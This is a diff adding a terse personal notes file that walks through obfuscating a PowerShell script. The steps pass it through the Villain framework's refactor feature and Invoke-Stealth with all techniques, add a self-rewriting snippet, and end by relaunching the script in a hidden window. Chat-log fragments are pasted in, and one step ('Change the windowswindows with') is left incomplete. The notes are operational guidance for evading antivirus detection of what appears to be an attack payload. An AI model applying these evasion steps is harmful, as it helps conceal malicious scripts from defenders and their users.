@@ -1,0 +1,47 @@
+notes: 
+
+
+https://github.com/t3l3machus/PowerShell-Obfuscation-Bible
+
+
+First step
+
+use Villain refactor 
+
+after
+
+[11:16 AM, 11/13/2023] Yavuz:kali
+[11:16 AM, 11/13/2023] Yavuz:pwsh
+[11:15 AM, 11/13/2023] Yavuz:.\Invoke-Stealth.ps1 script.ps1 -technique All
+
+
+Second step
+
+use Villain refactor  again 
+
+ 
+
+3th step
+
+Change the windowswindows with 
+
+ 
+
+4th step
+
+Add front the code 
+
+$scriptPath = $MyInvocation.MyCommand.Path
+$content = Get-Content -Path $scriptPath
+$modifiedContent = $content -replace 'google\.com', 'google_com'
+$modifiedContent | Set-Content -Path $scriptPath
+
+ 
+
+5th step
+
+Add last 
+
+Start-Process PowerShell -ArgumentList "-WindowStyle Hidden -File `"$scriptPath`"" -NoNewWindow
+
+ 
